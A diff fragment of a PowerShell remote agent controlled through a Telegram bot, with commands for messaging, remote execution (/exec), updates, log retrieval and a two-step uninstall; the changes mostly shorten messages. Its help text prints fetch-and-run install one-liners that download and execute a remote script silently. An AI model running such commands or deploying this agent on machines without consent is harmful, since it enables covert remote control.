                             if (-not $pcname) {
-                                Send-Telegram "[$PCName] Usage: /msg @pc <text>`n(e.g. /msg @PC-Office Hello)`nUse /msgall <text> to broadcast to ALL PCs."
+                                Send-Telegram "[$PCName] Usage: /msg @pc <text>`nUse /msgall <text> to broadcast to ALL PCs."
                             } elseif (-not $restText) {
-                                Send-Telegram "[$PCName] Usage: /msg @pc <text>`n(e.g. /msg @PC-Office Hello)"
+                                Send-Telegram "[$PCName] Usage: /msg @pc <text>"
                             } else {
                                 $ok = Invoke-Msg -Text $restText
                                 if ($ok) { Send-Telegram "[$PCName] Displayed: $restText" }
-                                else     { Send-Telegram "[$PCName] Cannot display (no user session)" }
+                                else     { Send-Telegram "[$PCName] Cannot display (no user session or error)" }
                             }
                         }
                         '/msgall' {
@@ -860,7 +987,7 @@ if (Test-Path '$InstallDir') {
                                 if ($ok) { Send-Telegram "[$PCName] Displayed (broadcast): $msgText" }
                                 else     { Send-Telegram "[$PCName] Cannot display (no user session)" }
                             } else {
-                                Send-Telegram "[$PCName] Usage: /msgall <text>`n(e.g. /msgall Backup now!)"
+                                Send-Telegram "[$PCName] Usage: /msgall <text>"
                             }
                         }
                         '/exec' {
@@ -875,28 +1002,23 @@ if (Test-Path '$InstallDir') {
                             Invoke-Update
                         }
                         '/uninstall' {
-                            # Two-step confirmation:
-                            # - First /uninstall: set pending flag, ask user to confirm within 10s
-                            # - Second /uninstall within 10s: actual uninstall
                             if (Test-UninstallConfirmation) {
-                                # Confirmed - do real uninstall
                                 Clear-UninstallPending
-                                Send-Telegram "[$PCName] Uninstall CONFIRMED. Removing in 3s... Scheduled task, script, config, and logs will be deleted. Agent will stop after this message."
+                                Send-Telegram "[$PCName] Uninstall CONFIRMED. Removing in 3s..."
                                 Invoke-SelfUninstall
                                 exit 0
                             } else {
-                                # First call - ask for confirmation
                                 Set-UninstallPending
-                                Send-Telegram "[$PCName] Uninstall requested. To CONFIRM, send /uninstall again within 10 seconds. Otherwise it will be cancelled."
-                                Write-Log "Uninstall pending confirmation (user must re-send /uninstall within 10s)"
+                                Send-Telegram "[$PCName] Uninstall requested. Send /uninstall again within 10s to CONFIRM."
+                                Write-Log "Uninstall pending confirmation"
                             }
                         }
                         '/log' {
                             if (Test-Path $LogPath) {
                                 $lines = Get-Content $LogPath -Tail 50
-                                $text = ($lines -join "`n")
-                                if ($text.Length -gt 3900) { $text = $text.Substring($text.Length - 3900) }
-                                Send-Telegram "[$PCName] Last 50 log lines:`n`n$text"
+                                $ltext = ($lines -join "`n")
+                                if ($ltext.Length -gt 3900) { $ltext = $ltext.Substring($ltext.Length - 3900) }
+                                Send-Telegram "[$PCName] Last 50 log lines:`n`n$ltext"
                             } else {
                                 Send-Telegram "[$PCName] No log file yet"
                             }
@@ -919,8 +1041,6 @@ if (Test-Path '$InstallDir') {
 
 [pc] = PC name (e.g. PC-Office), omit = ALL PCs.
 /msg and /exec REQUIRE @pc. /msgall does not need @pc.
-/uninstall removes agent completely - cannot be undone remotely.
-/uninstall requires sending the command TWICE within 10 seconds to confirm.
 "@
                             Send-Telegram $help
                         }
@@ -961,7 +1081,7 @@ if ($Install) {
         Write-Msg ''
         Write-Msg 'Stack trace:' -Color DarkGray
         Write-Msg $_.ScriptStackTrace -Color DarkGray
-        if (-not $Silent) { Pause-Exit 'Press Enter to exit...' }
+        if (-not $Silent) { Pause-Exit }
         exit 1
     }
 }
@@ -977,7 +1097,7 @@ if ($Uninstall) {
         Write-Msg ' UNINSTALL ERROR:' -Color Red
         Write-Msg '===================================================' -Color Red
         Write-Msg $_.Exception.Message -Color Yellow
-        if (-not $Silent) { Pause-Exit 'Press Enter to exit...' }
+        if (-not $Silent) { Pause-Exit }
         exit 1
     }
 }
@@ -999,7 +1119,7 @@ if (-not $Silent) {
     Write-Msg 'Install (silent, recommended):'
     Write-Msg "  & ([scriptblock]::Create((irm '$RepoUrl/pcagent.ps1'))) -Install -Silent -BotToken '123:ABC' -ChatId '123456' -PCName 'PC-Office'"
     Write-Msg ''
-    Write-Msg 'Install (interactive, will prompt for params):'
+    Write-Msg 'Install (interactive):'
     Write-Msg "  & ([scriptblock]::Create((irm '$RepoUrl/pcagent.ps1'))) -Install"
     Write-Msg ''
     Write-Msg 'Uninstall (silent):'
